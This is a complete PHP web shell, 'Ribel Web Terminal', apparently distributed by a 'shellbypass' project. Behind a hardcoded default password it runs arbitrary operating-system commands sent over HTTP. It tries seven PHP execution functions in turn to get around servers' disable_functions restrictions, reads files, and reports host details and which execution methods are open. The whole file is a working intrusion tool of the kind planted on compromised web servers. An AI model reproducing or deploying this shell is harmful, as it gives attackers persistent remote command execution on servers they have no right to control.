<?php
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);
$PASSWORD = "admin123";  // default Password
session_start();
define('SCRIPT_DIR', __DIR__);

if (!isset($_SESSION['saved_dirs'])) {
    $_SESSION['saved_dirs'] = [];
}
if (!isset($_SESSION['dir_history'])) {
    $_SESSION['dir_history'] = [getcwd()];
}
if (!isset($_SESSION['current_dir'])) {
    $_SESSION['current_dir'] = getcwd();
}

function goToScriptDir() {
    if (chdir(SCRIPT_DIR)) {
        $_SESSION['current_dir'] = SCRIPT_DIR;
        $_SESSION['old_dir'] = getcwd();
        return true;
    }
    return false;
}

function goToDir($target_dir) {
    $old_dir = getcwd();
    if (@chdir($target_dir)) {
        $_SESSION['old_dir'] = $old_dir;
        $_SESSION['current_dir'] = getcwd();
        return true;
    }
    return false;
}

function getCurrentDir() {
    if (isset($_SESSION['current_dir']) && is_dir($_SESSION['current_dir'])) {
        @chdir($_SESSION['current_dir']);
        return $_SESSION['current_dir'];
    } else {
        $dir = getcwd();
        $_SESSION['current_dir'] = $dir;
        return $dir;
    }
}

function executeCommand($command) {
    $output = '';
    $methods = [];
    
    // Method 1: shell_exec
    if (function_exists('shell_exec') && !in_array('shell_exec', explode(',', ini_get('disable_functions')))) {
        $methods[] = 'shell_exec';
        $result = @shell_exec($command . ' 2>&1');
        if ($result !== null && !empty(trim($result))) {
            return ['output' => $result, 'method' => 'shell_exec'];
        }
    }
    
    // Method 2: exec
    if (function_exists('exec') && !in_array('exec', array_map('trim', explode(',', ini_get('disable_functions'))), true)) {
        $methods[] = 'exec';
        $output_array = [];
        $return_var = -1;
    
        @exec($command . ' 2>&1', $output_array, $return_var);
    
        return [
            'output' => implode("\n", $output_array),
            'method' => 'exec',
            'exit_code' => $return_var,
            'success' => ($return_var === 0)
        ];
    }
    
    // Method 3: system
    if (function_exists('system') && !in_array('system', explode(',', ini_get('disable_functions')))) {
        $methods[] = 'system';
        ob_start();
        @system($command . ' 2>&1');
        $output = ob_get_clean();
        if (!empty(trim($output))) {
            return ['output' => $output, 'method' => 'system'];
        }
    }
    
    // Method 4: passthru
    if (function_exists('passthru') && !in_array('passthru', explode(',', ini_get('disable_functions')))) {
        $methods[] = 'passthru';
        ob_start();
        @passthru($command . ' 2>&1');
        $output = ob_get_clean();
        if (!empty(trim($output))) {
            return ['output' => $output, 'method' => 'passthru'];
        }
    }
    
    // Method 5: popen
    if (function_exists('popen') && !in_array('popen', explode(',', ini_get('disable_functions')))) {
        $methods[] = 'popen';
        $handle = @popen($command . ' 2>&1', 'r');
        if (is_resource($handle)) {
            $output = '';
            while (!feof($handle)) {
                $output .= fgets($handle);
            }
            pclose($handle);
            if (!empty(trim($output))) {
                return ['output' => $output, 'method' => 'popen'];
            }
        }
    }
    
    // Method 6: proc_open
    if (function_exists('proc_open') && !in_array('proc_open', explode(',', ini_get('disable_functions')))) {
        $methods[] = 'proc_open';
        $descriptors = [
            0 => ['pipe', 'r'],
            1 => ['pipe', 'w'],
            2 => ['pipe', 'w']
        ];
        
        $process = @proc_open($command, $descriptors, $pipes);
        if (is_resource($process)) {
            fclose($pipes[0]);
            $stdout = stream_get_contents($pipes[1]);
            $stderr = stream_get_contents($pipes[2]);
            fclose($pipes[1]);
            fclose($pipes[2]);
            proc_close($process);
            
            $output = $stdout . ($stderr ? "\n" . $stderr : '');
            if (!empty(trim($output))) {
                return ['output' => $output, 'method' => 'proc_open'];
            }
        }
    }
    
    // Method 7: backtick
    if (ini_get('disable_functions')) {
        try {
            $output = @`$command 2>&1`;
            if (!empty(trim($output))) {
                return ['output' => $output, 'method' => 'backtick'];
            }
        } catch (Exception $e) {}
    }
    
    // Jika semua metode gagal, coba native PHP
    $cmd_parts = explode(' ', trim($command));
    $base_cmd = $cmd_parts[0];
    
    switch ($base_cmd) {
        case 'pwd':
            return ['output' => getcwd(), 'method' => 'php_native'];
            
        case 'whoami':
            $output = function_exists('get_current_user') ? get_current_user() : ($_SESSION['user'] ?? 'unknown');
            if (function_exists('posix_getpwuid') && function_exists('posix_geteuid')) {
                $user_info = posix_getpwuid(posix_geteuid());
                $output = $user_info['name'] ?? $output;
            }
            return ['output' => $output, 'method' => 'php_native'];
            
        case 'date':
            return ['output' => date('Y-m-d H:i:s'), 'method' => 'php_native'];
            
        case 'uname':
            return ['output' => php_uname(), 'method' => 'php_native'];
            
        case 'ls':
        case 'dir':
            $path = $cmd_parts[1] ?? '.';
            $files = @scandir($path);
            if ($files) {
                return ['output' => implode("\n", array_diff($files, ['.', '..'])), 'method' => 'php_native'];
            }
            return ['output' => "Error reading directory", 'method' => 'php_native'];
            
        case 'cat':
        case 'type':
            if (isset($cmd_parts[1])) {
                $filename = $cmd_parts[1];
                if (file_exists($filename)) {
                    if (is_readable($filename)) {
                        return ['output' => file_get_contents($filename), 'method' => 'php_native'];
                    }
                    return ['output' => "cat: $filename: Permission denied", 'method' => 'php_native'];
                }
                return ['output' => "cat: $filename: No such file", 'method' => 'php_native'];
            }
            return ['output' => "cat: missing file operand", 'method' => 'php_native'];
    }
    
    return ['output' => 'Command execution not available. Tried methods: ' . implode(', ', $methods), 'method' => 'failed'];
}

function getSystemInfo() {
    $info = [];
    $info['os'] = PHP_OS;
    $info['os_version'] = php_uname('v');
    $info['hostname'] = gethostname() ?: 'localhost';
    $info['php_version'] = PHP_VERSION;
    $info['php_sapi'] = php_sapi_name();
    $info['disabled_functions'] = ini_get('disable_functions') ?: 'none';
    $info['memory_limit'] = ini_get('memory_limit');
    $info['max_execution_time'] = ini_get('max_execution_time');
    $info['server_software'] = $_SERVER['SERVER_SOFTWARE'] ?? 'Unknown';
    $info['server_protocol'] = $_SERVER['SERVER_PROTOCOL'] ?? 'Unknown';
    
    $methods = [];
    $funcs = ['shell_exec', 'exec', 'system', 'passthru', 'popen', 'proc_open'];
    foreach ($funcs as $func) {
        if (function_exists($func) && !in_array($func, explode(',', ini_get('disable_functions')))) {
            $methods[] = $func;
        }
    }
    $info['available_methods'] = implode(', ', $methods) ?: 'none';
    $info['user'] = $_SESSION['user'] ?? 'unknown';
    $info['current_dir'] = getcwd();
    
    return $info;
}

// ==================== MAIN API HANDLER ====================
if (isset($_GET['api']) || isset($_POST['api'])) {
    header('Content-Type: application/json');
    
    $action = $_POST['action'] ?? $_GET['action'] ?? '';

    if ($action === 'login') {
        $password = $_POST['password'] ?? '';
        
        if ($password === $PASSWORD) {
            $_SESSION['terminal_auth'] = true;
            $_SESSION['user'] = 'admin';
            $_SESSION['login_time'] = time();
            $_SESSION['current_dir'] = getcwd();
            
            echo json_encode([
                'success' => true,
                'message' => 'Login successful',
                'cwd' => getCurrentDir(),
                'user' => 'admin',
                'hostname' => gethostname() ?: 'localhost',
                'system' => getSystemInfo()
            ]);
        } else {
            echo json_encode([
                'success' => false,
                'error' => 'Invalid password'
            ]);
        }
        exit;
    }

    if (!isset($_SESSION['terminal_auth']) || $_SESSION['terminal_auth'] !== true) {
        echo json_encode(['error' => 'Not authenticated']);
        exit;
    }
    
    // ========== EXECUTE COMMAND ==========
    if ($action === 'execute') {
        $command = $_POST['command'] ?? '';
        $output = '';

        chdir($_SESSION['current_dir']);

        if (trim($command) === 'back' || trim($command) === 'scriptdir') {
            if (goToScriptDir()) {
                echo json_encode([
                    'output' => "Moved to script directory: " . SCRIPT_DIR,
                    'cwd' => $_SESSION['current_dir'],
                    'success' => true
                ]);
            } else {
                echo json_encode([
                    'output' => "Failed to move to script directory",
                    'cwd' => $_SESSION['current_dir'],
                    'success' => true
                ]);
            }
            exit;
        }

        if (trim($command) === 'back -' || trim($command) === 'prev') {
            if (isset($_SESSION['old_dir']) && chdir($_SESSION['old_dir'])) {
                $_SESSION['current_dir'] = getcwd();
                echo json_encode([
                    'output' => "Moved to previous directory: " . $_SESSION['current_dir'],
                    'cwd' => $_SESSION['current_dir'],
                    'success' => true
                ]);
            } else {
                echo json_encode([
                    'output' => "No previous directory",
                    'cwd' => $_SESSION['current_dir'],
                    'success' => true
                ]);
            }
            exit;
        }

        if (preg_match('/^\s*goto\s+(\d+)$/', $command, $matches)) {
            $index = intval($matches[1]) - 1;
            if (isset($_SESSION['dir_history'][$index])) {
                $target = $_SESSION['dir_history'][$index];
                if (goToDir($target)) {
                    echo json_encode([
                        'output' => "Moved to saved location #{$matches[1]}: " . $_SESSION['current_dir'],
                        'cwd' => $_SESSION['current_dir'],
                        'success' => true
                    ]);
                } else {
                    echo json_encode([
                        'output' => "Failed to move to saved location",
                        'cwd' => $_SESSION['current_dir'],
                        'success' => true
                    ]);
                }
            } else {
                echo json_encode([
                    'output' => "Invalid location number",
                    'cwd' => $_SESSION['current_dir'],
                    'success' => true
                ]);
            }
            exit;
        }

        if (preg_match('/^\s*save\s+(\w+)$/', $command, $matches)) {
            $name = $matches[1];
            $_SESSION['saved_dirs'][$name] = getcwd();
            echo json_encode([
                'output' => "Saved current directory as '$name': " . getcwd(),
                'cwd' => $_SESSION['current_dir'],
                'success' => true
            ]);
            exit;
        }
        
        if (preg_match('/^\s*load\s+(\w+)$/', $command, $matches)) {
            $name = $matches[1];
            if (isset($_SESSION['saved_dirs'][$name])) {
                $target = $_SESSION['saved_dirs'][$name];
                if (goToDir($target)) {
                    echo json_encode([
                        'output' => "Loaded directory '$name': " . $_SESSION['current_dir'],
                        'cwd' => $_SESSION['current_dir'],
                        'success' => true
                    ]);
                } else {
                    echo json_encode([
                        'output' => "Failed to load directory '$name'",
                        'cwd' => $_SESSION['current_dir'],
                        'success' => true
                    ]);
                }
            } else {
                echo json_encode([
                    'output' => "No saved directory named '$name'",
                    'cwd' => $_SESSION['current_dir'],
                    'success' => true
                ]);
            }
            exit;
        }
        
        if (trim($command) === 'savedirs' || trim($command) === 'lsdirs') {
            $output = "Saved directories:\n";
            if (!empty($_SESSION['saved_dirs'])) {
                foreach ($_SESSION['saved_dirs'] as $name => $dir) {
                    $output .= "  $name -> $dir\n";
                }
            } else {
                $output .= "  No saved directories\n";
            }
            
            $output .= "\nDirectory history:\n";
            if (!empty($_SESSION['dir_history'])) {
                $history = array_slice($_SESSION['dir_history'], -10);
                foreach ($history as $index => $dir) {
                    $num = count($_SESSION['dir_history']) - 10 + $index + 1;
                    $output .= "  [$num] $dir\n";
                }
            } else {
                $output .= "  No history\n";
            }
            
            echo json_encode([
                'output' => $output,
                'cwd' => $_SESSION['current_dir'],
                'success' => true
            ]);
            exit;
        }
        
        if (preg_match('/^\s*cd\s+(.*)$/', $command, $matches)) {
            $dir = trim($matches[1], " '\"");
            
            if (!isset($_SESSION['dir_history'])) {
                $_SESSION['dir_history'] = [];
            }
            
            $current = getcwd();
            if (!in_array($current, $_SESSION['dir_history'])) {
                $_SESSION['dir_history'][] = $current;
                if (count($_SESSION['dir_history']) > 50) {
                    array_shift($_SESSION['dir_history']);
                }
            }
            
            if (empty($dir) || $dir === '~') {
                $home = $_SERVER['HOME'] ?? '/';
                if (@chdir($home)) {
                    $_SESSION['old_dir'] = $current;
                    $_SESSION['current_dir'] = getcwd();
                    $output = '';
                } else {
                    $output = "cd: cannot cd to home directory";
                }
            } elseif ($dir === '-') {
                if (isset($_SESSION['old_dir'])) {
                    if (@chdir($_SESSION['old_dir'])) {
                        $_SESSION['current_dir'] = getcwd();
                        $output = '';
                    } else {
                        $output = "cd: cannot cd to previous directory";
                    }
                } else {
                    $output = "cd: no previous directory";
                }
            } else {
                $old_dir = getcwd();
                
                if (@chdir($dir)) {
                    $_SESSION['old_dir'] = $old_dir;
                    $_SESSION['current_dir'] = getcwd();
                    $output = '';
                } else {
                    $output = "cd: no such directory: $dir";
                }
            }
            
            echo json_encode([
                'output' => $output,
                'cwd' => $_SESSION['current_dir'],
                'success' => true
            ]);
            exit;
        }
        
        if (trim($command) === 'clear' || trim($command) === 'cls') {
            echo json_encode([
                'clear' => true,
                'cwd' => $_SESSION['current_dir']
            ]);
            exit;
        }
        
        $result = executeCommand($command);
        $output = $result['output'] ?? '';
        $method = $result['method'] ?? 'unknown';
        $success = $result['success'] ?? true;
        $exitCode = $result['exit_code'] ?? 0;
        
        $responseData = [
            'output' => ($output !== '' ? $output : '(no output)'),
            'cwd' => $_SESSION['current_dir'] ?? getcwd(),
            'method' => $method,
            'success' => $success,
            'exit_code' => $exitCode
        ];
        
        $json = json_encode(
            $responseData,
            JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES | JSON_INVALID_UTF8_SUBSTITUTE
        );
        
        if ($json === false) {
            http_response_code(500);
            echo '{"error":"Failed to encode JSON response"}';
        } else {
            echo $json;
        }
        exit;
    }
    
    if ($action === 'methods') {
        $info = getSystemInfo();
        echo json_encode([
            'success' => true,
            'methods' => $info['available_methods'],
            'disabled_functions' => $info['disabled_functions'],
            'system' => $info
        ]);
        exit;
    }
    
    if ($action === 'logout') {
        session_destroy();
        echo json_encode(['success' => true]);
        exit;
    }
    
    if ($action === 'info') {
        echo json_encode(getSystemInfo());
        exit;
    }
    
    echo json_encode(['error' => 'Unknown action']);
    exit;
}

// ==================== TAMPILAN ====================
if (!isset($_SESSION['terminal_auth']) || $_SESSION['terminal_auth'] !== true) {
    showLoginScreen();
    exit;
}

chdir($_SESSION['current_dir']);
showTerminal();
exit;

// ==================== FUNGSI TAMPILAN ====================
function showLoginScreen() {
    global $PASSWORD;
    ?>
    <!DOCTYPE html>
    <html>
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Ribel Web Terminal Login</title>
        <link rel="icon" href="https://www.shellbypass.com/images/kurakura.ico" type="image/x-icon">
        <meta property="og:image" content="https://raw.shellbypass.com/og-image.png">
        <style>
            body {
                font-family: 'Courier New', monospace;
                background: #0a0e14;
                color: #b3b1ad;
                display: flex;
                justify-content: center;
                align-items: center;
                height: 100vh;
                margin: 0;
            }
            .login-container {
                background: #1c2023;
                border: 1px solid #3d444d;
                border-radius: 5px;
                padding: 30px;
                width: 350px;
                box-shadow: 0 0 20px rgba(0,0,0,0.5);
            }
            .login-header {
                text-align: center;
                margin-bottom: 30px;
                color: #80a665;
            }
            .login-header h1 {
                margin: 0;
                font-size: 24px;
            }
            .login-form input {
                width: 100%;
                padding: 12px;
                margin-bottom: 15px;
                background: #0a0e14;
                border: 1px solid #3d444d;
                color: #b3b1ad;
                border-radius: 3px;
                font-family: 'Courier New', monospace;
                font-size: 14px;
                box-sizing: border-box;
            }
            .login-form input:focus {
                outline: none;
                border-color: #80a665;
            }
            .login-form button {
                width: 100%;
                padding: 12px;
                background: #80a665;
                color: #0a0e14;
                border: none;
                border-radius: 3px;
                font-family: 'Courier New', monospace;
                font-size: 14px;
                font-weight: bold;
                cursor: pointer;
                transition: background 0.3s;
            }
            .login-form button:hover {
                background: #90b675;
            }
            .error-message {
                color: #e67e80;
                text-align: center;
                margin-bottom: 15px;
                padding: 10px;
                background: rgba(230, 126, 128, 0.1);
                border-radius: 3px;
                display: none;
            }
            .password-hint {
                text-align: center;
                margin-top: 15px;
                font-size: 12px;
                color: #6c7986;
            }
        </style>
    </head>
    <body>
        <div class="login-container">
            <div class="login-header">
                <h1>TERMINAL ACCESS</h1>
                <p>Enter password to continue</p>
            </div>
            
            <div class="error-message" id="errorMsg"></div>
            
            <form class="login-form" id="loginForm">
                <input type="password" 
                       id="password" 
                       placeholder="Password" 
                       autocomplete="off" 
                       autofocus
                       required>
                <button type="submit">CONNECT</button>
            </form>
            
            <div class="password-hint">
                Telegram: <code>@polri</code>
            </div>
        </div>

        <script>
        document.getElementById('loginForm').onsubmit = async function(e) {
            e.preventDefault();
            
            const password = document.getElementById('password').value;
            const errorMsg = document.getElementById('errorMsg');
            
            if (!password) {
                showError('Password is required');
                return false;
            }
            
            try {
                const formData = new FormData();
                formData.append('api', '1');
                formData.append('action', 'login');
                formData.append('password', password);
                const response = await fetch('?', {
                    method: 'POST',
                    body: formData
                });
                
                const raw = await response.text();
                
                if (!raw.trim()) {
                    throw new Error('Response kosong dari server');
                }
                
                let data;
                try {
                    data = JSON.parse(raw);
                } catch (e) {
                    throw new Error('Response bukan JSON valid: ' + raw.slice(0, 300));
                }
                
                if (data.success) {
                    window.location.href = '?';
                } else {
                    showError(data.error || 'Invalid password');
                    document.getElementById('password').value = '';
                    document.getElementById('password').focus();
                }
                
            } catch (error) {
                showError('Connection failed: ' + error.message);
            }
            
            return false;
        };
        
        function showError(message) {
            const errorMsg = document.getElementById('errorMsg');
            errorMsg.textContent = message;
            errorMsg.style.display = 'block';
            
            setTimeout(() => {
                errorMsg.style.display = 'none';
            }, 3000);
        }
        
        document.getElementById('password').addEventListener('input', function() {
            document.getElementById('errorMsg').style.display = 'none';
        });
        
        document.getElementById('password').focus();
    </script>
    </body>
    </html>
    <?php
}

function showTerminal() {
    $current_dir = $_SESSION['current_dir'] ?? getcwd();
    ?>
    <!DOCTYPE html>
    <html>
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Ribel Web Terminal</title>
        <link rel="icon" href="https://www.shellbypass.com/images/kurakura.ico" type="image/x-icon">
        <meta property="og:image" content="https://raw.shellbypass.com/og-image.png">
        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css">
        <style>
            * {
                margin: 0;
                padding: 0;
                box-sizing: border-box;
            }
            
            body {
                font-family: 'Consolas', 'Monaco', monospace;
                background: #1e1e1e;
                color: #d4d4d4;
                height: 100vh;
                overflow: hidden;
            }
            
            #terminal-container {
                display: flex;
                flex-direction: column;
                height: 100vh;
            }
            
            .terminal-header {
                background: #2d2d30;
                padding: 10px 20px;
                border-bottom: 1px solid #3e3e42;
                display: flex;
                justify-content: space-between;
                align-items: center;
            }
            
            .header-left {
                display: flex;
                align-items: center;
                gap: 15px;
            }
            
            .header-title {
                color: #569cd6;
                font-weight: bold;
            }
            
            .header-info {
                font-size: 12px;
                color: #9cdcfe;
            }
            
            .header-right button {
                background: #3e3e42;
                color: #d4d4d4;
                border: 1px solid #505050;
                padding: 5px 15px;
                margin-left: 5px;
                border-radius: 3px;
                cursor: pointer;
                font-family: 'Consolas', monospace;
                font-size: 12px;
            }
            
            .header-right button:hover {
                background: #505050;
            }
            
            #terminal-output {
                flex: 1;
                padding: 20px;
                overflow-y: auto;
                font-size: 14px;
                line-height: 1.4;
                background: #1e1e1e;
            }
            
            .output-line {
                margin-bottom: 5px;
                white-space: pre-wrap;
                word-break: break-word;
            }
            
            .command-line {
                color: #9cdcfe;
            }
            
            .prompt {
                color: #4ec9b0;
                font-weight: bold;
            }
            
            .error {
                color: #f44747;
            }
            
            .success {
                color: #6a9955;
            }
            
            .method-tag {
                color: #888888;
                font-size: 10px;
                margin-left: 10px;
            }
            
            #input-area {
                display: flex;
                background: #252526;
                border-top: 1px solid #3e3e42;
                padding: 10px;
            }
            
            #prompt-display {
                color: #4ec9b0;
                font-weight: bold;
                margin-right: 10px;
                white-space: nowrap;
                line-height: 24px;
            }
            
            #command-input {
                flex: 1;
                background: transparent;
                border: none;
                color: #d4d4d4;
                font-family: 'Consolas', monospace;
                font-size: 14px;
                outline: none;
                caret-color: #d4d4d4;
            }
            
            #terminal-output::-webkit-scrollbar {
                width: 10px;
            }
            
            #terminal-output::-webkit-scrollbar-track {
                background: #1e1e1e;
            }
            
            #terminal-output::-webkit-scrollbar-thumb {
                background: #424242;
                border-radius: 5px;
            }
            
            #terminal-output::-webkit-scrollbar-thumb:hover {
                background: #505050;
            }
            
            .cursor {
                display: inline-block;
                width: 8px;
                height: 16px;
                background-color: #d4d4d4;
                margin-left: 2px;
                animation: blink 1s infinite;
            }
            
            @keyframes blink {
                0%, 50% { opacity: 1; }
                51%, 100% { opacity: 0; }
            }
        </style>
    </head>
    <body>
        <div id="terminal-container">
            <div class="terminal-header">
                <div class="header-left">
                    <div class="header-title">
                        <i class="bi bi-terminal-fill"></i> WEB TERMINAL 
                        <i class="bi bi-cpu" style="margin-left: 10px; font-size: 0.9em;"></i>
                        <i class="bi bi-hdd-stack" style="margin-left: 5px; font-size: 0.9em;"></i>
                    </div>
                    <div class="header-info">
                        User: <?php echo htmlspecialchars($_SESSION['user'] ?? 'admin'); ?> | 
                        Dir: <span id="current-dir"><?php echo htmlspecialchars($current_dir); ?></span>
                    </div>
                </div>
                <div class="header-right">
                    <button onclick="executeCommand('clear')">Clear</button>
                    <button onclick="showSystemInfo()">Info</button>
                    <button onclick="showMethods()">Methods</button>
                    <button onclick="logout()">Logout</button>
                </div>
            </div>
            
            <div id="terminal-output">
                <div class="output-line success">
                    Welcome to Ribel Web Terminal! Session started at <?php echo date('H:i:s'); ?>
                </div>
                <div class="output-line">
                    Type <span style="color: #4ec9b0">help</span> for available commands
                </div>
                <div class="output-line">
                    Type <span style="color: #4ec9b0">methods</span> to see available execution methods
                </div>
                <div class="output-line">
                    ----------------------------------------------------
                </div>
            </div>
            
            <div id="input-area">
                <div id="prompt-display">$</div>
                <input type="text" 
                       id="command-input" 
                       autocomplete="off" 
                       autofocus 
                       placeholder="Type command...">
                <div class="cursor"></div>
            </div>
        </div>

        <script>
        let commandHistory = [];
        let historyIndex = -1;
        let currentDir = '<?php echo addslashes($current_dir); ?>';
        let debugMode = false;
        
        const terminalOutput = document.getElementById('terminal-output');
        const commandInput = document.getElementById('command-input');
        const promptDisplay = document.getElementById('prompt-display');
        const currentDirSpan = document.getElementById('current-dir');
        
        document.addEventListener('DOMContentLoaded', function() {
            updatePrompt();
            commandInput.focus();
            
            commandInput.addEventListener('keydown', function(e) {
                switch(e.key) {
                    case 'Enter':
                        e.preventDefault();
                        executeCommand(commandInput.value.trim());
                        break;
                        
                    case 'ArrowUp':
                        e.preventDefault();
                        if (commandHistory.length > 0) {
                            if (historyIndex > 0) historyIndex--;
                            if (historyIndex >= 0) {
                                commandInput.value = commandHistory[historyIndex];
                            }
                        }
                        break;
                        
                    case 'ArrowDown':
                        e.preventDefault();
                        if (historyIndex < commandHistory.length - 1) {
                            historyIndex++;
                            commandInput.value = commandHistory[historyIndex];
                        } else {
                            historyIndex = commandHistory.length;
                            commandInput.value = '';
                        }
                        break;
                }
            });
            
            document.body.addEventListener('click', function() {
                commandInput.focus();
            });
            
            addOutput('<span class="prompt">$</span> <span class="command-line">help</span>');
            addOutput('<div class="output-line">Download Original On <a href="https://github.com/ShellBypassID/RibelWebTerminal">github.com</a></div>');
        });
        
        function updatePrompt() {
            let displayDir = currentDir;
            if (displayDir.length > 30) {
                displayDir = '...' + displayDir.substr(-27);
            }
            promptDisplay.textContent = displayDir + ' $';
            currentDirSpan.textContent = displayDir;
        }
        
        async function executeCommand(command) {
            if (!command.trim()) return;
            
            commandHistory.push(command);
            historyIndex = commandHistory.length;
            addCommand(command);
            commandInput.value = '';
            
            if (command === 'clear' || command === 'cls') {
                terminalOutput.innerHTML = `
                    <div class="output-line success">Terminal cleared</div>
                    <div class="output-line">----------------------------------------------------</div>
                `;
                return;
            }
            
            if (command === 'help') {
                addOutput('<div class="output-line">Available commands:</div>');
                addOutput('<div class="output-line">  help        - Show this help</div>');
                addOutput('<div class="output-line">  clear       - Clear terminal</div>');
                addOutput('<div class="output-line">  pwd         - Current directory</div>');
                addOutput('<div class="output-line">  ls          - List files</div>');
                addOutput('<div class="output-line">  cd          - Change directory</div>');
                addOutput('<div class="output-line">  back        - Go to script directory</div>');
                addOutput('<div class="output-line">  back -      - Go to previous directory</div>');
                addOutput('<div class="output-line">  prev        - Same as back -</div>');
                addOutput('<div class="output-line">  scriptdir   - Same as back</div>');
                addOutput('<div class="output-line">  save [name] - Save current directory</div>');
                addOutput('<div class="output-line">  load [name] - Load saved directory</div>');
                addOutput('<div class="output-line">  savedirs    - List saved directories</div>');
                addOutput('<div class="output-line">  lsdirs      - Same as savedirs</div>');
                addOutput('<div class="output-line">  goto [n]    - Go to history #n</div>');
                addOutput('<div class="output-line">  whoami      - Current user</div>');
                addOutput('<div class="output-line">  uname       - System info</div>');
                addOutput('<div class="output-line">  cat         - View file</div>');
                addOutput('<div class="output-line">  methods     - Show available execution methods</div>');
                addOutput('<div class="output-line">  debug       - Toggle debug mode</div>');
                scrollToBottom();
                return;
            }
            
            if (command === 'methods') {
                await showMethods();
                return;
            }
            
            if (command === 'debug') {
                debugMode = !debugMode;
                addOutput('<div class="output-line success">Debug mode: ' + (debugMode ? 'ON' : 'OFF') + '</div>');
                scrollToBottom();
                return;
            }
            
            try {
                // Tentukan URL berdasarkan debugMode
                let url = '?';
                if (debugMode) {
                    url = '?debug=1';
                }
                
                const formData = new FormData();
                formData.append('api', '1');
                formData.append('action', 'execute');
                formData.append('command', command);
                
                // HAPUS duplikasi fetch - hanya SATU fetch
                const response = await fetch(url, {
                    method: 'POST',
                    body: formData
                });
                
                const raw = await response.text();
                
                if (!raw.trim()) {
                    throw new Error('Response kosong dari server');
                }
                
                let data;
                try {
                    data = JSON.parse(raw);
                } catch (e) {
                    throw new Error('Response bukan JSON valid: ' + raw.slice(0, 300));
                }
                
                if (data.error) {
                    addOutput('<div class="error">Error: ' + data.error + '</div>');
                } else if (data.clear) {
                    terminalOutput.innerHTML = `
                        <div class="output-line success">Terminal cleared</div>
                        <div class="output-line">----------------------------------------------------</div>
                    `;
                } else {
                    let outputHtml = '<div class="output-line">' + escapeHtml(data.output) + '</div>';
                    
                    if (debugMode && data.method) {
                        outputHtml += '<div class="method-tag">[executed via: ' + data.method + ']</div>';
                    }
                    
                    addOutput(outputHtml);
                    
                    if (data.cwd && data.cwd !== currentDir) {
                        currentDir = data.cwd;
                        updatePrompt();
                    }
                }
                
            } catch (error) {
                addOutput('<div class="error">Connection error: ' + error.message + '</div>');
            }
            
            scrollToBottom();
        }
        
        async function showMethods() {
            addCommand('methods');
            
            try {
                const formData = new FormData();
                formData.append('api', '1');
                formData.append('action', 'methods');
                
                // HAPUS duplikasi fetch - hanya SATU fetch
                const response = await fetch('?', {
                    method: 'POST',
                    body: formData
                });
                
                const raw = await response.text();
                
                if (!raw.trim()) {
                    throw new Error('Response kosong dari server');
                }
                
                let data;
                try {
                    data = JSON.parse(raw);
                } catch (e) {
                    throw new Error('Response bukan JSON valid: ' + raw.slice(0, 300));
                }
                
                if (data.success) {
                    addOutput('<div class="output-line">=== EXECUTION METHODS ===</div>');
                    addOutput('<div class="output-line">Available: ' + data.methods + '</div>');
                    addOutput('<div class="output-line">Disabled functions: ' + data.disabled_functions + '</div>');
                    addOutput('<div class="output-line">PHP Version: ' + data.system.php_version + '</div>');
                    addOutput('<div class="output-line">OS: ' + data.system.os + '</div>');
                }
                
            } catch (error) {
                addOutput('<div class="error">Error getting methods: ' + error.message + '</div>');
            }
            
            scrollToBottom();
        }
        
        async function showSystemInfo() {
            addCommand('systeminfo');
            
            try {
                const formData = new FormData();
                formData.append('api', '1');
                formData.append('action', 'info');
                
                // HAPUS duplikasi fetch - hanya SATU fetch
                const response = await fetch('?', {
                    method: 'POST',
                    body: formData
                });
                
                const raw = await response.text();
                
                if (!raw.trim()) {
                    throw new Error('Response kosong dari server');
                }
                
                let data;
                try {
                    data = JSON.parse(raw);
                } catch (e) {
                    throw new Error('Response bukan JSON valid: ' + raw.slice(0, 300));
                }
                
                if (!data.error) {
                    addOutput('<div class="output-line">=== SYSTEM INFORMATION ===</div>');
                    for (let [key, value] of Object.entries(data)) {
                        addOutput('<div class="output-line">' + key + ': ' + value + '</div>');
                    }
                }
                
            } catch (error) {
                addOutput('<div class="error">Error getting system info: ' + error.message + '</div>');
            }
            
            scrollToBottom();
        }
        
        async function logout() {
            try {
                const formData = new FormData();
                formData.append('api', '1');
                formData.append('action', 'logout');
                
                await fetch('?', {
                    method: 'POST',
                    body: formData
                });
                
                window.location.href = '?';
                
            } catch (error) {
                addOutput('<div class="error">Logout error: ' + error.message + '</div>');
            }
        }
        
        function addCommand(command) {
            const line = document.createElement('div');
            line.className = 'output-line';
            line.innerHTML = '<span class="prompt">' + promptDisplay.textContent + '</span> <span class="command-line">' + escapeHtml(command) + '</span>';
            terminalOutput.appendChild(line);
        }
        
        function addOutput(content) {
            const line = document.createElement('div');
            line.className = 'output-line';
            line.innerHTML = content;
            terminalOutput.appendChild(line);
        }
        
        function scrollToBottom() {
            terminalOutput.scrollTop = terminalOutput.scrollHeight;
        }
        
        function escapeHtml(text) {
            const div = document.createElement('div');
            div.textContent = text;
            return div.innerHTML;
        }
    </script>
    </body>
    </html>
    <?php
}
?>
